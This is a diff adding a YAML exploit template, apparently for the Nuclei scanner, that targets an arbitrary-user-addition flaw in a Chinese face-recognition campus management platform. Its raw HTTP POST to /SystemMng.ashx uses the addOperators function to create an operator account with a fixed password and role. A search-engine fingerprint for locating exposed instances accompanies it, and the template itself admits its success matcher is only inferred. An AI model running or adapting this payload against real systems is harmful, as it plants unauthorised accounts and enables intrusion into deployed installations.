@@ -1,0 +1,44 @@
+id: poc-735ff7b63f56cd5450a6
+info:
+  name: 脸爱云一脸通智慧管理平台SystemMng存在任意用户添加漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/735ff7b63f56cd5450a6a68933fa1aa3
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 735ff7b63f56cd5450a6a68933fa1aa3
+    fofa: + hunter`web.icon=="4f0be080512ee0b45fc90ff894b6ba60"`
+http:
+- raw:
+  - 'POST /SystemMng.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Cookie: ASP.NET_SessionId=whnrkuaqbz0lyv1fbwtzf23y
+
+    Upgrade-Insecure-Requests: 1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 175
+
+
+    operatorName=stctest&operatorPwd=123456&operpassword=123456&operatorRole=00&visible_jh=%E8%AF%B7%E9%80%89%E6%8B%A9&visible_dorm=%E8%AF%B7%E9%80%89%E6%8B%A9&funcName=addOperators'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
